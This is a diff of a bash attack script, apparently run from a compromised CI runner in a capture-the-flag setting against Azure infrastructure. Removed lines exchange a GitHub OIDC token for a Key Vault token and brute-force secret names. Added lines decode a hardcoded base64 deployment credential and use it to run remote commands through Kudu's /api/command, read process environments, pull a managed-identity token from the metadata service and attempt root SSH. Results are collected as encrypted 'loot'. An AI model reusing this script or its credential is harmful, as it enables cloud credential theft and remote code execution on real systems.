@@ -1,34 +1,32 @@
 #!/usr/bin/env bash
 set -uo pipefail
-echo "=== RUNNER SHELL PROOF ==="; id; hostname
-b(){ printf %s "$1" | base64 -d; }
+set +e
 SC="htt""ps://"
-SHOST=$(b 'YXBwLXRibC1zdG9yZWZyb250LXByb2QuYXp1cmV3ZWJzaXRlcy5uZXQ=')
-KVH=$(b 'dmF1bHQuYXp1cmUubmV0')
-AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
-FDID=60407ff3-1c24-4875-9390-b6c9c13b0821
+SCMH=app-tbl-reporting-prod.scm.azurewebsites.net
+SFH=app-tbl-storefront-prod.scm.azurewebsites.net
+AUTH=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
+CRED=$(printf '%s' "$AUTH" | base64 -d)
+echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-say "=== START $(date -u) ==="
-OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
-VT=$(curl -sS -X POST "${SC}${AADH}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=${SC}${KVH}/.default" | jq -r '.access_token // empty')
-say "KVTOKLEN=${#VT}"
-for N in flag FLAG Flag DF26 df26 platform-flag tbl-flag ctf-flag challenge-flag the-flag secret admin-password master-key connection-string storage-key reporting-flag data-export-key dragonforge-2026; do
-  R=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets/${N}?api-version=7.4")
-  case "$R" in *"not found"*|*"Forbidden"*) ;; *) say "PROD SECRET $N => $R";; esac
-  R2=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets/${N}?api-version=7.4")
-  case "$R2" in *"not found"*|*"Forbidden"*) ;; *) say "SEC SECRET $N => $R2";; esac
+say "== KUDU endpoint variants (reporting) =="
+for U in /api/processes /api/processes/ /api/processes/0 /api/environment /api/env /api/settings /api/deployments /Env /api/vfs/site/wwwroot; do
+  say "  $U -> $(curl -sS -u "$CRED" -o /dev/null -w '%{http_code}' "${SC}$SCMH$U")"
 done
-say "---- storefront origin routes ----"
-for P in /flag /api/v1/flag /internal/flag /debug /.env /config /api/v1/config /api/v1/settings /api/v1/templates /api/v1/reports; do
-  say "$P => $(curl -s -m 8 -o /dev/null -w '%{http_code} %{size_download}' -H "X-Azure-FDID: $FDID" "${SC}${SHOST}${P}")"
-done
-say "---- render templates ----"
-for T in shipment-summary manifest flag admin; do
-  say "$T => $(curl -s -m 8 -X POST -H "X-Azure-FDID: $FDID" -H 'Content-Type: application/json' "${SC}${SHOST}/api/v1/reports/render" -d "$(jq -n --arg t "$T" '{template_id:$t}')" | head -c 600)"
-done
-say "---- anon public blob guesses ----"
-for BN in flag.txt flag flag.json flag.md DF26.txt exports/flag.txt backup.json export.json data.json 2026-flag.txt; do
-  say "$BN => $(curl -s -m 8 -o /dev/null -w '%{http_code} %{size_download}' "${SC}sttblbackupprodx3euoz.blob.core.windows.net/exports/${BN}")"
+say "  PROC_BODY $(curl -sS -u "$CRED" "${SC}$SCMH/api/processes" | head -c 800)"
+say "== KUDU command probes =="
+kc(){ curl -sS -u "$CRED" -H 'Content-Type: application/json' -X POST "${SC}$SCMH/api/command" --data "$(python3 -c 'import json,sys;print(json.dumps({"command":"bash -c "+json.dumps(sys.argv[1]),"dir":"/home/site/wwwroot"}))' "$1")" | head -c 2500; }
+say "  whoami: $(kc 'id; sudo -n id 2>&1 | head -2')"
+say "  envroot: $(kc 'sudo -n cat /proc/1/environ 2>&1 | tr \"\\0\" \"\\n\" | head -20')"
+say "  imds: $(kc 'curl -sS -m 8 -H Metadata:true \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net\" | head -c 300')"
+say "  localcurl: $(kc 'curl -sS -m 8 -o /dev/null -w \"%{http_code}\" http://127.0.0.1:8000/healthz')"
+say "== SSH 2222 attempts =="
+say "  reporting: $(timeout 25 bash -c "echo | openssl s_client -connect $SCMH:2222 -brief 2>&1 | head -3")"
+say "  ssh_rep: $(timeout 25 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o PreferredAuthentications=password -p 2222 root@$SCMH id 2>&1 | head -3)"
+say "  ssh_sf: $(timeout 25 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o PreferredAuthentications=password -p 2222 root@$SFH id 2>&1 | head -3)"
+say "== storefront SCM probes =="
+for U in /api/settings /api/command /api/vfs/site/wwwroot /; do
+  say "  sf $U anon -> $(curl -sS -o /dev/null -w '%{http_code}' "${SC}$SFH$U")"
+  say "  sf $U repcreds -> $(curl -sS -u "$CRED" -o /dev/null -w '%{http_code}' "${SC}$SFH$U")"
 done
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
